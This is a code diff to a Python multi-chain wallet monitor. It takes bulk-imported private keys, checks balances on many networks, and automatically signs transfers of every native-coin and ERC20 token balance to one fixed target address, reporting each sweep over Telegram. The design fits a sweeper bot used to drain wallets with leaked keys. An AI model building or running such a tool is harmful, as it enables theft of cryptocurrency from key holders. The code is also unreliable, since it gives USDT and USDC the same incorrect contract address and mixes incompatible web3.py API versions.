@@ -294,8 +294,66 @@ TRANSFER_STATS = {
     'successful_notifications': 0,
     'failed_notifications': 0,
     'last_transfer_time': None,
-    'daily_stats': {}
+    'daily_stats': {},
+    'erc20_transfers': 0,
+    'insufficient_gas_events': 0
 }
+
+# ERC20代币配置
+ERC20_SCAN_ENABLED = True  # 是否启用ERC20扫描
+MIN_TOKEN_VALUE_USD = 0.1  # 最小代币价值（美元）
+
+# 常见的有价值ERC20代币地址 (主要在以太坊主网)
+VALUABLE_ERC20_TOKENS = {
+    'ethereum': {
+        '0xA0b86a33E6441E98F076EE6E5ede8Bd7C81a5E22': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
+        '0xA0b86a33E6441E98F076EE6E5ede8Bd7C81a5E22': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
+        '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': {'symbol': 'UNI', 'decimals': 18, 'name': 'Uniswap'},
+        '0x514910771AF9Ca656af840dff83E8264EcF986CA': {'symbol': 'LINK', 'decimals': 18, 'name': 'Chainlink'},
+        '0x6B175474E89094C44Da98b954EedeAC495271d0F': {'symbol': 'DAI', 'decimals': 18, 'name': 'Dai Stablecoin'},
+        # 添加更多代币地址...
+    },
+    'polygon': {
+        '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
+        '0xc2132D05D31c914a87C6611C10748AEb04B58e8F': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
+        # 添加更多代币地址...
+    }
+}
+
+# ERC20 ABI (简化版，只包含必要函数)
+ERC20_ABI = [
+    {
+        "constant": True,
+        "inputs": [{"name": "_owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "type": "function"
+    },
+    {
+        "constant": True,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{"name": "", "type": "uint8"}],
+        "type": "function"
+    },
+    {
+        "constant": True,
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [{"name": "", "type": "string"}],
+        "type": "function"
+    },
+    {
+        "constant": False,
+        "inputs": [
+            {"name": "_to", "type": "address"},
+            {"name": "_value", "type": "uint256"}
+        ],
+        "name": "transfer",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+    }
+]
 
 def update_transfer_stats(network_name: str, amount: float, currency: str, notification_success: bool = False):
     """更新转账统计"""
@@ -970,6 +1028,329 @@ class WalletMonitor:
         self.load_network_status()
         load_transfer_stats()  # 加载转账统计
         
+    async def dynamic_rpc_test(self) -> Dict[str, bool]:
+        """动态测试所有RPC连接，返回可用网络列表"""
+        print(f"\n{Fore.CYAN}🔍 动态测试RPC连接 - 检测可用网络...{Style.RESET_ALL}")
+        
+        available_networks = {}
+        network_config = build_network_config(use_rotation=True)
+        
+        # 并发测试所有网络
+        async def test_single_rpc(network_key: str):
+            try:
+                config = network_config.get(network_key)
+                if not config:
+                    return network_key, False, "配置不存在"
+                
+                # 创建Web3连接
+                web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 8}))
+                
+                # 测试连接 - 使用event loop executor执行同步操作
+                loop = asyncio.get_event_loop()
+                block_number = await loop.run_in_executor(None, web3.eth.get_block_number)
+                
+                # 验证响应
+                if isinstance(block_number, int) and block_number > 0:
+                    # 保存可用的客户端
+                    self.web3_clients[network_key] = web3
+                    return network_key, True, f"区块高度: {block_number}"
+                else:
+                    return network_key, False, "无效响应"
+                    
+            except Exception as e:
+                error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
+                return network_key, False, error_msg
+        
+        # 限制并发数量
+        semaphore = asyncio.Semaphore(5)
+        
+        async def test_with_limit(network_key):
+            async with semaphore:
+                return await test_single_rpc(network_key)
+        
+        # 执行并发测试
+        tasks = [test_with_limit(net_key) for net_key in network_config.keys()]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # 处理结果
+        success_count = 0
+        mainnet_count = 0
+        testnet_count = 0
+        failed_networks = []
+        
+        for result in results:
+            if isinstance(result, Exception):
+                continue
+                
+            network_key, success, info = result
+            
+            if success:
+                available_networks[network_key] = True
+                success_count += 1
+                
+                # 更新网络状态
+                self.network_status[network_key] = NetworkStatus(
+                    available=True,
+                    last_check=datetime.now().isoformat(),
+                    error_count=0,
+                    last_error=""
+                )
+                
+                if network_key in MAINNET_NETWORKS:
+                    mainnet_count += 1
+                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (主网) - {info}{Style.RESET_ALL}")
+                else:
+                    testnet_count += 1
+                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (测试网) - {info}{Style.RESET_ALL}")
+            else:
+                available_networks[network_key] = False
+                failed_networks.append((network_key, info))
+                
+                # 更新网络状态
+                self.network_status[network_key] = NetworkStatus(
+                    available=False,
+                    last_check=datetime.now().isoformat(),
+                    error_count=1,
+                    last_error=info
+                )
+        
+        # 显示失败的网络
+        if failed_networks:
+            print(f"\n{Fore.YELLOW}⚠️ 不可用的网络 ({len(failed_networks)}个):{Style.RESET_ALL}")
+            for network_key, error in failed_networks[:5]:  # 只显示前5个
+                print(f"  🔴 {NETWORK_NAMES[network_key]} - {error}")
+            if len(failed_networks) > 5:
+                print(f"  ... 还有 {len(failed_networks) - 5} 个网络不可用")
+        
+        self.save_network_status()
+        
+        print(f"\n{Fore.GREEN}📊 RPC连接测试完成!{Style.RESET_ALL}")
+        print(f"  ✅ 可用网络: {success_count}/{len(network_config)} 个")
+        print(f"  🌐 主网: {mainnet_count} 个")
+        print(f"  🧪 测试网: {testnet_count} 个")
+        print(f"  🔴 不可用: {len(failed_networks)} 个")
+        
+        return available_networks
+
+    async def check_wallet_transaction_history(self, address: str, available_networks: Dict[str, bool]) -> Dict[str, int]:
+        """检查钱包在各个网络的交易记录"""
+        print(f"\n{Fore.CYAN}📊 检查钱包交易记录: {address[:10]}...{address[-8:]}{Style.RESET_ALL}")
+        
+        wallet_networks = {}
+        
+        # 并发检查所有可用网络的交易记录
+        async def check_tx_history(network_key: str):
+            if not available_networks.get(network_key, False):
+                return network_key, 0, "网络不可用"
+            
+            try:
+                web3 = self.web3_clients.get(network_key)
+                if not web3:
+                    if not self.load_network_on_demand(network_key):
+                        return network_key, 0, "无法连接"
+                    web3 = self.web3_clients.get(network_key)
+                
+                # 使用event loop executor执行同步操作
+                loop = asyncio.get_event_loop()
+                tx_count = await loop.run_in_executor(None, web3.eth.get_transaction_count, address)
+                
+                return network_key, tx_count, "成功"
+                
+            except Exception as e:
+                error_msg = str(e)[:30] + "..." if len(str(e)) > 30 else str(e)
+                return network_key, 0, error_msg
+        
+        # 限制并发数量
+        semaphore = asyncio.Semaphore(8)
+        
+        async def check_with_limit(network_key):
+            async with semaphore:
+                return await check_tx_history(network_key)
+        
+        # 只检查可用的网络
+        available_network_keys = [k for k, v in available_networks.items() if v]
+        
+        print(f"{Fore.CYAN}🔍 并发检查 {len(available_network_keys)} 个可用网络的交易记录...{Style.RESET_ALL}")
+        
+        # 执行并发检查
+        tasks = [check_with_limit(net_key) for net_key in available_network_keys]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # 处理结果
+        active_networks = []
+        total_tx_count = 0
+        
+        for result in results:
+            if isinstance(result, Exception):
+                continue
+                
+            network_key, tx_count, status = result
+            
+            if tx_count > 0:
+                wallet_networks[network_key] = tx_count
+                active_networks.append(network_key)
+                total_tx_count += tx_count
+                
+                network_type = "主网" if network_key in MAINNET_NETWORKS else "测试网"
+                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} ({network_type}) - {tx_count} 笔交易{Style.RESET_ALL}")
+            else:
+                if status == "成功":  # 连接成功但无交易
+                    print(f"{Fore.BLUE}💡 {NETWORK_NAMES[network_key]} - 无交易记录{Style.RESET_ALL}")
+                else:  # 连接失败
+                    print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {status}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.GREEN}📊 交易记录统计:{Style.RESET_ALL}")
+        print(f"  🎯 有交易记录的网络: {len(active_networks)} 个")
+        print(f"  📊 总交易数量: {total_tx_count} 笔")
+        print(f"  🚫 无交易记录的网络: {len(available_network_keys) - len(active_networks)} 个")
+        
+        return wallet_networks
+
+    async def scan_erc20_tokens(self, address: str, network_key: str, web3) -> List[Dict]:
+        """扫描钱包的ERC20代币余额"""
+        if not ERC20_SCAN_ENABLED or network_key not in VALUABLE_ERC20_TOKENS:
+            return []
+        
+        tokens_found = []
+        token_addresses = VALUABLE_ERC20_TOKENS[network_key]
+        
+        print(f"{Fore.CYAN}🪙 扫描 {len(token_addresses)} 个ERC20代币...{Style.RESET_ALL}")
+        
+        for token_address, token_info in token_addresses.items():
+            try:
+                # 创建代币合约实例
+                loop = asyncio.get_event_loop()
+                
+                # 在executor中执行合约调用
+                contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
+                balance = await loop.run_in_executor(None, contract.functions.balanceOf(address).call)
+                
+                if balance > 0:
+                    # 计算实际余额
+                    decimals = token_info['decimals']
+                    actual_balance = balance / (10 ** decimals)
+                    
+                    tokens_found.append({
+                        'address': token_address,
+                        'symbol': token_info['symbol'],
+                        'name': token_info['name'],
+                        'balance': actual_balance,
+                        'balance_raw': balance,
+                        'decimals': decimals
+                    })
+                    
+                    print(f"{Fore.GREEN}💰 发现代币: {actual_balance:.6f} {token_info['symbol']}{Style.RESET_ALL}")
+                
+            except Exception as e:
+                continue  # 忽略单个代币的错误
+        
+        return tokens_found
+
+    async def calculate_smart_gas(self, web3, from_address: str, to_address: str, value: int, is_erc20: bool = False, token_address: str = None) -> Dict:
+        """智能Gas计算 - 优化小余额转账"""
+        try:
+            loop = asyncio.get_event_loop()
+            
+            # 获取最新的gas价格
+            gas_price = await loop.run_in_executor(None, lambda: web3.eth.gas_price)
+            
+            # 获取网络建议的gas价格（如果支持）
+            try:
+                # 尝试获取EIP-1559的gas费用
+                latest_block = await loop.run_in_executor(None, lambda: web3.eth.get_block('latest'))
+                if hasattr(latest_block, 'baseFeePerGas') and latest_block.baseFeePerGas:
+                    # 使用EIP-1559
+                    base_fee = latest_block.baseFeePerGas
+                    max_priority_fee = web3.to_wei(2, 'gwei')  # 2 gwei tip
+                    max_fee = base_fee + max_priority_fee
+                    
+                    gas_config = {
+                        'type': 'eip1559',
+                        'maxFeePerGas': max_fee,
+                        'maxPriorityFeePerGas': max_priority_fee,
+                        'baseFee': base_fee
+                    }
+                else:
+                    # 使用传统gas价格
+                    gas_config = {
+                        'type': 'legacy',
+                        'gasPrice': gas_price
+                    }
+            except:
+                # 回退到传统方式
+                gas_config = {
+                    'type': 'legacy',
+                    'gasPrice': gas_price
+                }
+            
+            # 估算gas限制
+            if is_erc20 and token_address:
+                # ERC20转账的gas估算
+                try:
+                    contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
+                    gas_limit = await loop.run_in_executor(
+                        None, 
+                        lambda: contract.functions.transfer(to_address, value).estimateGas({'from': from_address})
+                    )
+                    # 增加10%的安全边际
+                    gas_limit = int(gas_limit * 1.1)
+                except:
+                    gas_limit = 70000  # ERC20转账的默认gas限制
+            else:
+                # 原生代币转账
+                try:
+                    gas_limit = await loop.run_in_executor(
+                        None,
+                        lambda: web3.eth.estimate_gas({
+                            'from': from_address,
+                            'to': to_address,
+                            'value': value
+                        })
+                    )
+                    # 增加5%的安全边际
+                    gas_limit = int(gas_limit * 1.05)
+                except:
+                    gas_limit = 21000  # 标准转账gas限制
+            
+            # 计算总gas费用
+            if gas_config['type'] == 'eip1559':
+                total_gas_cost = gas_limit * gas_config['maxFeePerGas']
+            else:
+                total_gas_cost = gas_limit * gas_config['gasPrice']
+            
+            # 优化小余额转账 - 使用更低的gas价格
+            if not is_erc20:  # 只对原生代币转账进行优化
+                balance_wei = value + total_gas_cost
+                if balance_wei < web3.to_wei(0.001, 'ether'):  # 小于0.001 ETH的余额
+                    # 降低gas价格以最大化转账金额
+                    optimized_gas_price = int(gas_price * 0.8)  # 降低20%
+                    optimized_gas_cost = gas_limit * optimized_gas_price
+                    
+                    gas_config.update({
+                        'optimized': True,
+                        'gasPrice': optimized_gas_price,
+                        'original_gas_cost': total_gas_cost,
+                        'optimized_gas_cost': optimized_gas_cost
+                    })
+                    total_gas_cost = optimized_gas_cost
+            
+            gas_config.update({
+                'gasLimit': gas_limit,
+                'totalGasCost': total_gas_cost
+            })
+            
+            return gas_config
+            
+        except Exception as e:
+            # 返回默认配置
+            return {
+                'type': 'legacy',
+                'gasPrice': web3.to_wei(20, 'gwei'),
+                'gasLimit': 70000 if is_erc20 else 21000,
+                'totalGasCost': web3.to_wei(20, 'gwei') * (70000 if is_erc20 else 21000),
+                'error': str(e)
+            }
+
     def initialize_clients(self):
         """智能初始化网络客户端 - 轮询API密钥模式"""
         print(f"\n{Fore.CYAN}🔧 智能初始化网络客户端...{Style.RESET_ALL}")
@@ -1651,67 +2032,272 @@ class WalletMonitor:
         return active_networks
     
     async def batch_scan_all_wallets(self):
-        """批量扫描所有钱包 - 一次性完成所有钱包的扫描"""
-        print(f"{Fore.CYAN}📡 开始批量扫描 {len(self.wallets)} 个钱包...{Style.RESET_ALL}")
+        """批量扫描所有钱包 - 智能优化版本"""
+        print(f"{Fore.CYAN}📡 开始智能批量扫描 {len(self.wallets)} 个钱包...{Style.RESET_ALL}")
+        
+        # 第一步：动态测试RPC连接
+        print(f"{Fore.MAGENTA}🔄 第1阶段: 动态RPC连接测试{Style.RESET_ALL}")
+        available_networks = await self.dynamic_rpc_test()
+        
+        if not any(available_networks.values()):
+            print(f"{Fore.RED}❌ 没有可用的网络连接！{Style.RESET_ALL}")
+            return
+        
+        # 第二步：检查钱包交易记录
+        print(f"\n{Fore.MAGENTA}🔄 第2阶段: 钱包交易记录分析{Style.RESET_ALL}")
+        wallet_network_map = {}  # 存储每个钱包有交易记录的网络
+        
+        for i, wallet in enumerate(self.wallets):
+            print(f"{Fore.CYAN}📊 [{i + 1}/{len(self.wallets)}] 分析钱包交易记录...{Style.RESET_ALL}")
+            wallet_networks = await self.check_wallet_transaction_history(wallet.address, available_networks)
+            wallet_network_map[wallet.address] = wallet_networks
+        
+        # 第三步：智能余额扫描和转账
+        print(f"\n{Fore.MAGENTA}🔄 第3阶段: 智能余额扫描与转账{Style.RESET_ALL}")
+        
+        total_found = 0
+        total_transferred = 0
+        erc20_found = 0
+        gas_insufficient_count = 0
         
         # 并发扫描所有钱包
-        semaphore = asyncio.Semaphore(3)  # 限制并发数量
+        semaphore = asyncio.Semaphore(2)  # 限制并发数量
         
-        async def scan_single_wallet(wallet_index, wallet):
+        async def smart_scan_wallet(wallet_index, wallet):
+            nonlocal total_found, total_transferred, erc20_found, gas_insufficient_count
+            
             async with semaphore:
                 short_addr = f"{wallet.address[:8]}...{wallet.address[-6:]}"
-                print(f"{Fore.CYAN}[{wallet_index + 1}/{len(self.wallets)}] 扫描钱包: {short_addr}{Style.RESET_ALL}")
+                print(f"\n{Fore.CYAN}🔍 [{wallet_index + 1}/{len(self.wallets)}] 智能扫描: {short_addr}{Style.RESET_ALL}")
                 
-                # 获取可用网络
-                available_networks = [
-                    net for net in wallet.enabled_networks 
-                    if self.network_status.get(net, NetworkStatus(True, "", 0, "")).available
-                ]
+                # 获取该钱包有交易记录的网络
+                wallet_networks = wallet_network_map.get(wallet.address, {})
                 
-                if not available_networks:
-                    print(f"{Fore.YELLOW}⚠️ [{wallet_index + 1}] 没有可用的网络{Style.RESET_ALL}")
+                if not wallet_networks:
+                    print(f"{Fore.BLUE}💡 [{wallet_index + 1}] 跳过 - 无交易记录{Style.RESET_ALL}")
                     return
                 
-                # 按优先级排序 (主网优先)
-                available_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
+                # 按优先级排序网络
+                sorted_networks = sorted(wallet_networks.keys(), key=lambda x: NETWORK_PRIORITY.get(x, 999))
+                print(f"{Fore.CYAN}🎯 检查 {len(sorted_networks)} 个有活动的网络 (共{wallet_networks[sorted_networks[0]]}笔交易){Style.RESET_ALL}")
                 
-                # 检查所有可用网络的余额
-                found_balance = False
-                for network_key in available_networks:
+                # 扫描每个网络
+                for network_key in sorted_networks:
                     try:
+                        if not available_networks.get(network_key, False):
+                            continue
+                        
+                        web3 = self.web3_clients.get(network_key)
+                        if not web3:
+                            continue
+                        
+                        # 检查原生代币余额
                         balance = await self.get_balance_optimized(wallet.address, network_key)
                         
                         if balance > 0:
-                            found_balance = True
-                            # 获取网络配置以显示正确的货币单位
+                            total_found += 1
                             network_info = SUPPORTED_NETWORKS.get(network_key)
                             currency = network_info['config']['currency'] if network_info else 'ETH'
                             
-                            print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
-                            print(f"{Fore.CYAN}📍 钱包: {wallet.address}{Style.RESET_ALL}")
-                            print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
-                            print(f"{Fore.CYAN}💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
+                            print(f"\n{Fore.GREEN}💰 发现原生代币余额!{Style.RESET_ALL}")
+                            print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]} | 💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
                             
-                            # 自动转账
-                            print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
-                            success = await self.transfer_balance_optimized(wallet, network_key, balance)
-                            
+                            # 智能转账
+                            success = await self.smart_transfer_balance(wallet, network_key, balance, web3)
                             if success:
-                                print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
-                            else:
-                                print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
+                                total_transferred += 1
+                        
+                        # 扫描ERC20代币
+                        if ERC20_SCAN_ENABLED:
+                            tokens = await self.scan_erc20_tokens(wallet.address, network_key, web3)
+                            
+                            for token in tokens:
+                                erc20_found += 1
+                                print(f"{Fore.MAGENTA}🪙 发现ERC20代币: {token['balance']:.6f} {token['symbol']}{Style.RESET_ALL}")
+                                
+                                # 尝试转账ERC20代币
+                                success = await self.smart_transfer_erc20(wallet, network_key, token, web3)
+                                if success:
+                                    total_transferred += 1
+                                else:
+                                    # 检查是否是gas不足
+                                    eth_balance = await self.get_balance_optimized(wallet.address, network_key)
+                                    if eth_balance < 0.001:  # 少于0.001 ETH可能不够gas
+                                        gas_insufficient_count += 1
+                                        await self.send_gas_insufficient_notification(wallet.address, token, network_key)
                     
                     except Exception as e:
+                        print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 扫描异常: {str(e)[:30]}...{Style.RESET_ALL}")
                         continue
-                
-                if not found_balance:
-                    print(f"{Fore.BLUE}💡 [{wallet_index + 1}] 钱包无余额{Style.RESET_ALL}")
         
-        # 并发扫描所有钱包
-        tasks = [scan_single_wallet(i, wallet) for i, wallet in enumerate(self.wallets)]
+        # 执行并发扫描
+        tasks = [smart_scan_wallet(i, wallet) for i, wallet in enumerate(self.wallets)]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        print(f"{Fore.GREEN}📊 批量扫描完成！{Style.RESET_ALL}")
+        # 显示扫描总结
+        print(f"\n{Fore.GREEN}🎉 智能批量扫描完成！{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📊 扫描统计:{Style.RESET_ALL}")
+        print(f"  💰 发现余额: {total_found} 个")
+        print(f"  ✅ 成功转账: {total_transferred} 个")
+        print(f"  🪙 ERC20代币: {erc20_found} 个")
+        print(f"  ⛽ Gas不足事件: {gas_insufficient_count} 个")
+        
+        # 更新统计
+        TRANSFER_STATS['erc20_transfers'] += erc20_found
+        TRANSFER_STATS['insufficient_gas_events'] += gas_insufficient_count
+        save_transfer_stats()
+    
+    async def smart_transfer_balance(self, wallet: WalletInfo, network_key: str, balance: float, web3) -> bool:
+        """智能转账原生代币 - 使用优化的Gas计算"""
+        try:
+            config = SUPPORTED_NETWORKS[network_key]['config']
+            account = Account.from_key(wallet.private_key)
+            
+            # 智能Gas计算
+            balance_wei = Web3.to_wei(balance, 'ether')
+            gas_config = await self.calculate_smart_gas(web3, wallet.address, TARGET_ADDRESS, balance_wei)
+            
+            # 计算转账金额
+            transfer_amount = balance_wei - gas_config['totalGasCost']
+            
+            if transfer_amount <= 0:
+                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
+                return False
+            
+            # 获取nonce
+            loop = asyncio.get_event_loop()
+            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, wallet.address)
+            
+            # 构建交易
+            transaction = {
+                'to': TARGET_ADDRESS,
+                'value': transfer_amount,
+                'gas': gas_config['gasLimit'],
+                'nonce': nonce,
+                'chainId': config['chain_id']
+            }
+            
+            # 根据Gas类型设置费用
+            if gas_config['type'] == 'eip1559':
+                transaction.update({
+                    'maxFeePerGas': gas_config['maxFeePerGas'],
+                    'maxPriorityFeePerGas': gas_config['maxPriorityFeePerGas']
+                })
+            else:
+                transaction['gasPrice'] = gas_config['gasPrice']
+            
+            # 签名并发送交易
+            signed_txn = account.sign_transaction(transaction)
+            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
+            
+            # 记录转账并发送通知
+            await self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_config['totalGasCost'], gas_config.get('gasPrice', 0), config)
+            
+            if gas_config.get('optimized'):
+                print(f"{Fore.CYAN}⚡ 使用优化Gas模式节省费用{Style.RESET_ALL}")
+            
+            return True
+            
+        except Exception as e:
+            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 智能转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
+            return False
+    
+    async def smart_transfer_erc20(self, wallet: WalletInfo, network_key: str, token: Dict, web3) -> bool:
+        """智能转账ERC20代币"""
+        try:
+            account = Account.from_key(wallet.private_key)
+            
+            # 创建代币合约
+            contract = web3.eth.contract(address=token['address'], abi=ERC20_ABI)
+            
+            # 智能Gas计算
+            gas_config = await self.calculate_smart_gas(
+                web3, wallet.address, TARGET_ADDRESS, 
+                token['balance_raw'], is_erc20=True, token_address=token['address']
+            )
+            
+            # 检查ETH余额是否足够支付gas
+            eth_balance_wei = await self.get_balance_optimized(wallet.address, network_key) * 10**18
+            
+            if eth_balance_wei < gas_config['totalGasCost']:
+                print(f"{Fore.YELLOW}⚠️ ETH余额不足支付ERC20转账gas费{Style.RESET_ALL}")
+                return False
+            
+            # 获取nonce
+            loop = asyncio.get_event_loop()
+            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, wallet.address)
+            
+            # 构建ERC20转账交易
+            transaction = contract.functions.transfer(TARGET_ADDRESS, token['balance_raw']).buildTransaction({
+                'gas': gas_config['gasLimit'],
+                'nonce': nonce,
+                'chainId': SUPPORTED_NETWORKS[network_key]['config']['chain_id']
+            })
+            
+            # 根据Gas类型设置费用
+            if gas_config['type'] == 'eip1559':
+                transaction.update({
+                    'maxFeePerGas': gas_config['maxFeePerGas'],
+                    'maxPriorityFeePerGas': gas_config['maxPriorityFeePerGas']
+                })
+            else:
+                transaction['gasPrice'] = gas_config['gasPrice']
+            
+            # 签名并发送交易
+            signed_txn = account.sign_transaction(transaction)
+            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
+            
+            # 发送ERC20转账成功通知
+            await self.send_erc20_transfer_notification(wallet.address, token, network_key, tx_hash.hex())
+            
+            print(f"{Fore.GREEN}✅ ERC20转账成功: {token['balance']:.6f} {token['symbol']}{Style.RESET_ALL}")
+            return True
+            
+        except Exception as e:
+            print(f"{Fore.RED}❌ ERC20转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
+            return False
+    
+    async def send_gas_insufficient_notification(self, wallet_address: str, token: Dict, network_key: str):
+        """发送Gas不足通知"""
+        if not TELEGRAM_NOTIFICATIONS_ENABLED:
+            return
+        
+        message = f"""⛽ <b>Gas不足警告</b>
+
+🪙 <b>代币:</b> {token['balance']:.6f} {token['symbol']}
+📍 <b>钱包:</b> <code>{wallet_address[:10]}...{wallet_address[-8:]}</code>
+🌐 <b>网络:</b> {NETWORK_NAMES[network_key]}
+⚠️ <b>问题:</b> ETH余额不足支付Gas费
+
+💡 <b>建议:</b> 向此钱包转入少量ETH作为Gas费用
+⏰ <b>时间:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"""
+        
+        try:
+            await send_telegram_notification(message)
+        except:
+            pass
+    
+    async def send_erc20_transfer_notification(self, wallet_address: str, token: Dict, network_key: str, tx_hash: str):
+        """发送ERC20转账成功通知"""
+        if not TELEGRAM_NOTIFICATIONS_ENABLED:
+            return
+        
+        message = f"""🪙 <b>ERC20代币转账成功！</b>
+
+💰 <b>代币:</b> {token['balance']:.6f} {token['symbol']}
+📝 <b>名称:</b> {token['name']}
+🌐 <b>网络:</b> {NETWORK_NAMES[network_key]}
+📍 <b>来源钱包:</b> <code>{wallet_address[:10]}...{wallet_address[-8:]}</code>
+🎯 <b>目标地址:</b> <code>{TARGET_ADDRESS[:10]}...{TARGET_ADDRESS[-8:]}</code>
+📋 <b>交易哈希:</b> <code>{tx_hash[:16]}...{tx_hash[-16:]}</code>
+⏰ <b>时间:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+
+🔗 完整交易: <code>{tx_hash}</code>"""
+        
+        try:
+            await send_telegram_notification(message)
+        except:
+            pass
     
     async def start_monitoring(self):
         """开始监控所有钱包 - 批量扫描模式"""
@@ -2457,7 +3043,7 @@ class WalletMonitor:
             
             print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
             print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别，支持任意格式){Style.RESET_ALL}")
-            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(批量扫描，先扫描所有钱包再等待间隔){Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(智能3阶段扫描：RPC测试→交易记录→余额转账+ERC20){Style.RESET_ALL}")
             print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(完整诊断，网络分析){Style.RESET_ALL}")
             print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 🔑 API密钥管理 {Fore.GREEN}(轮询系统，无限扩展){Style.RESET_ALL}")
             print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🔄 重启程序    {Fore.GREEN}(清理缓存，重新初始化){Style.RESET_ALL}")
